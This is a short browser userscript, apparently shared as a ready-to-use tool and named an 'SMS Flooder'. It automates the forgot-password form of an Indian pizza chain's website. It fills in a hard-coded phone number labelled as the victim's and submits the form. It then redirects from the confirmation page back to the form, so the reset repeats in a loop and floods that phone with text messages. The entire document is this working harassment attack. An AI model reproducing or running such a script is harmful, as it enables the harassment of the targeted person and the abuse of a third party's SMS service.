// ==UserScript==
// @name           Dominos SMS Flooder BY SUNNY020
// @namespace      SUNNY020
// @description    SMS Flooder
// @include        http://www.uppercrust.co.in/forgotpass.asp
// @include        http://www.uppercrust.co.in/thankspass.asp?msgType=%20contact%20number
// ==/UserScript==

var number="8092262928"; // Victim's number

if(document.location=="http://www.uppercrust.co.in/forgotpass.asp")
{
	document.forms[0].elements[1].value=number;
	document.forms[0].elements[2].click();
}
else if(document.location=="http://www.uppercrust.co.in/thankspass.asp?msgType=%20contact%20number")
{
	document.location="http://www.uppercrust.co.in/forgotpass.asp";
}